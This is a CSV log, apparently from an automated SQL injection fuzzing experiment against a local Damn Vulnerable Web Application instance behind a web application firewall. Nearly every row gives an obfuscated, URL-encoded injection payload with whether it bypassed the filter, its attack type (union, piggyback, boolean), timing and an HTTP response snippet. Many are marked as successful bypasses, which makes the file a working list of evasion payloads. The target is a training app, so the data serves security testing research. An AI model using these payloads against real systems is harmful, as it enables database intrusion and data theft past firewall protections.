Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0%27<@=.1%0b||+!+1=%0b(!+{a+1}=1),Bypassed,Yes,Yes (unionAtk),Unknown,0.0571,70.1,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1+||%0b!+{a%0b1}=1=%0b(not+{x+(select,Bypassed,Yes,Yes (unionAtk),Unknown,0.0124,70.1,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+||+!+{x%0b(select%0b1)}=1=+(not+{x,Bypassed,Yes,Yes (unionAtk),Unknown,0.0158,70.1,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+or%0bnot+{x+(select+1)}=1=+(not+{`if`,Blocked,No,None,Unknown,0.0146,70.1,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1%0b||%0b!+{a%0b1}=1=%0b(!%0b{x+(select,Bypassed,Yes,Yes (unionAtk),Unknown,0.0339,70.1,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1+or%0b!+{a+1}=1=%0b(!+{x+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0315,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+||+not+{a+1}=1=+(not%0b{a%0b1}=1,Bypassed,Yes,Yes (unionAtk),Unknown,0.0256,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1+||+!+{x+(select+1)}=1=%0b(!+,Blocked,No,None,Unknown,0.0116,70.71,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.+||+not+{a+1}=1=%0b(!%0b{x+(select,Bypassed,No,None,Unknown,0.0327,70.71,No,500,
0%27<@=1.%0bor%0bnot~0=+(!+{a%0b1}=1),Bypassed,Yes,Yes (unionAtk),Unknown,0.023,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1+||+!%0b{`if`+1}=1=%0b(false)--+,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0212,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1+or+not+{x%0b(select+1)}=1=+(not+{x,Bypassed,No,None,Unknown,0.0312,70.71,No,500,
0%27<@=.1%0bor%0b!+{x+(select+1)}=1=%0b(!+{x,Bypassed,Yes,Yes (unionAtk),Unknown,0.0259,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.+||+not%0b1=+(!%0b{x%0b(select+,Bypassed,No,None,Unknown,0.0228,70.71,No,500,
0'or+!@<@.%0bor%0bnot+{a+1}=1=%0b(not+,Bypassed,No,None,Unknown,0.0337,70.71,No,500,
0'<@!=1.+||+not+true=%0b(not%0b{`if`+1}=1),Bypassed,No,None,Unknown,0.0105,70.71,No,500,
0'<@!=.1%0b||+!+{x+(select%0b1)}=1=%0b(!+,Bypassed,No,None,Unknown,0.0296,70.71,No,500,
0'<@=1.+||%0b!%0b{x+(select+1)}=1=+(not%0b,Blocked,No,None,Unknown,0.0104,70.71,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=.1%0b||+not+{`if`+1}=1=%0b(not+{x%0b(select,Bypassed,No,None,Unknown,0.0251,70.71,No,500,
0'<@!=.1+or+!%7efalse=+(!+1)%0b||,Bypassed,No,None,booleanAtk,0.0107,70.71,No,500,
0%27<@=1.+||%0b!%0btrue=+(0)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0176,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1+||%0b!%0b{x%0b(select%0b1)}=1=%0b(not%0b{`if`,Bypassed,Yes,Yes (unionAtk),Unknown,0.0165,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.%0b||+not%7efalse=+(!+{`if`+1}=1),Bypassed,Yes,Yes (unionAtk),Unknown,0.02,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0bor%0bnot%0b{x+(select%0b1)}=1=%0b(!%0b{a,Bypassed,No,None,Unknown,0.0706,70.71,No,500,
0'<@!=1.+or+!+{x+(select%0b1)}=1=%0b(!+{x,Blocked,No,None,Unknown,0.0512,70.71,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.+||+!+{a%0b1}=1=%0b(not%0b{a+1}=1,Bypassed,Yes,Yes (unionAtk),Unknown,0.0245,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27or+!@<@.%0bor%0b1%0blike%0b{a%0b1}=1+or%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.037,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+||%0b!+{x%0b(select+1)}=1=+(not+{`if`,Bypassed,No,None,Unknown,0.0246,70.71,No,500,
0'<@=.1+or%0bnot+{a+1}=1=%0b(!+{`if`+,Bypassed,No,None,Unknown,0.0191,70.71,No,500,
0%27<@=1%0b||%0bnot~0=+(!+true)--+,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0172,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.+or%0bnot+{x+(select%0b1)}=1=+(not%0b{a,Blocked,No,None,Unknown,0.0106,70.71,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1+||%0bnot%0b{x%0b(select+1)}=1=+(not+,Blocked,No,None,Unknown,0.01,70.86,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1.%0b||%0bnot+{x%0b(select%0b1)}=1=%0b(!%0b{x,Bypassed,No,None,Unknown,0.0234,71.01,No,500,
0'<@=1%0bor+!%0b{x+(select+1)}=1=+(not+{x,Bypassed,No,None,Unknown,0.0316,71.01,No,500,
0'<@=.1%0bor+not%0b{x%0b(select%0b1)}=1=%0b(!~,Bypassed,No,None,Unknown,0.0236,71.01,No,500,
0%27<@!=1.%0b||%0bnot+{a+1}=1=+(!+{a%0b1}=1,Bypassed,Yes,Yes (unionAtk),Unknown,0.0086,71.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+or%0b!+{x+(select+1)}=1=+(not%0b{x,Blocked,No,None,Unknown,0.0274,71.01,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=.1%0bor+not%0b1%0bis+false+or',Bypassed,No,None,booleanAtk,0.0349,71.01,No,500,
0'||+@<@.+||%0b{`if`+1}=1+like+{x+(select+1)}=1,Bypassed,No,None,Unknown,0.0288,71.01,No,500,
0'<@!=1.%0bor%0b!+{a+1}=1=+(not~false),Bypassed,No,None,booleanAtk,0.0318,71.01,No,500,
0%27<@!=1.%0b||%0b~%0b{`if`%0b1}=1=+({a+1}=1)+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0161,71.12,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1%0bor%0b!+{a+1}=1=%0b(not+{`if`+1}=1,Bypassed,No,None,Unknown,0.0182,71.24,No,500,
0'<@!=.1+||+!%0b{x%0b(select%0b1)}=1=%0b(!+{x,Bypassed,No,None,Unknown,0.0279,71.24,No,500,
0%27<@!=.1%0b||+not%7e0=+(not%0b{x%0b(select+1)}=1,Bypassed,Yes,Yes (unionAtk),Unknown,0.0215,71.24,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'or+@<@.+or%0bnot+{`if`+1}=1=+(!+,Bypassed,No,None,Unknown,0.0297,71.27,No,500,
0%27<@=1%0bor+not+{x%0b(select+1)}=1=+(!+{`if`,Bypassed,Yes,Yes (unionAtk),Unknown,0.0177,69.85,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1%0bor%0b!%0b{x%0b(select%0b1)}=1=%0b(!%0b{a,Bypassed,Yes,Yes (unionAtk),Unknown,0.023,70.1,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1%0b||+!+{x+(select%0b1)}=1=+(!+true,Bypassed,No,None,Unknown,0.0173,70.1,No,500,
0%27<@!=1+||%0b{a%0b1}=1%0blike%0b{x+(select+1)}=1%23,Blocked,No,None,piggyAtk,0.0214,70.1,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1+or+not+{x+(select+1)}=1=+(not%0b1,Blocked,No,None,Unknown,0.0165,70.1,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=.1+or%0bnot+{a+1}=1=+(!%0b{x%0b,Bypassed,No,None,Unknown,0.0329,70.1,No,500,
0'<@=1.+||+not+1=%0b(not+{x%0b(select%0b1)}=1,Bypassed,No,None,Unknown,0.0245,70.1,No,500,
0%27<@=1.%0b||%0bnot%0b{x+(select+1)}=1=%0b(not+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0272,70.1,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1%0b||+0=+(!%0b{x%0b(select+1)}=1),Bypassed,No,None,Unknown,0.0195,70.1,No,500,
0'<@=.1+or+not+{x+(select+1)}=1=+(not+{a,Blocked,No,None,Unknown,0.0095,70.1,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.+or%0bnot+{a+1}=1=%0b(!+true),Bypassed,Yes,Yes (unionAtk),booleanAtk,0.025,70.1,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+||+{x%0b(select+1)}=1+like+{x+(select+1)}=1+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0283,70.4,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+or+!+{a%0b1}=1=%0b(not%0b{x+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0167,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0bor%0b!%0b{x+(select+1)}=1=+(not+{x,Bypassed,No,None,Unknown,0.0187,70.71,No,500,
0%27or+@<@.%0b||+!+{x%0b(select+1)}=1=+(!,Bypassed,Yes,Yes (unionAtk),Unknown,0.023,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1+||+!%0b{`if`%0b1}=1=%0b(false)--%0b,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.029,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1%0b||+!+{x%0b(select%0b1)}=1=+(not+{x,Bypassed,No,None,Unknown,0.0354,70.71,No,500,
0'<@=.1+||%0bnot%0b{`if`%0b1}=1=%0b(not+true),Bypassed,No,None,Unknown,0.0274,70.71,No,500,
0'<@=.1%0b||+not%0b1=+(not+1)--%0b,Bypassed,No,None,piggyAtk,0.0108,70.71,No,500,
0%27<@=1%0b||+not%0b{x%0b(select%0b1)}=1=%0b(!%0b{`if`,Bypassed,Yes,Yes (unionAtk),Unknown,0.0341,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27or+!@<@+or+{a+1}=1%0blike+{`if`%0b1}=1+||,Bypassed,Yes,Yes (unionAtk),Unknown,0.0233,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+||+!+{x+(select%0b1)}=1=+(not%0b{a,Blocked,No,None,Unknown,0.0145,70.71,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.+||+!%0b{a+1}=1=%0b(!+{x+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0173,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1%0b||%0b!+{`if`%0b1}=1=%0b(not+{`if`+1}=1,Bypassed,No,None,Unknown,0.0254,70.71,No,500,
0'<@=.1%0b||+{`if`+1}=1+like+true%0bor%27,Bypassed,No,None,booleanAtk,0.0119,70.71,No,500,
0%27<@!=1%0b||+!+{a+1}=1%0bis%0bfalse+or',Bypassed,No,None,booleanAtk,0.0238,70.71,No,500,
0%27<@!=1%0b||%0bnot+{a+1}=1=+(not+{a+1}=1,Bypassed,Yes,Yes (unionAtk),Unknown,0.0674,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
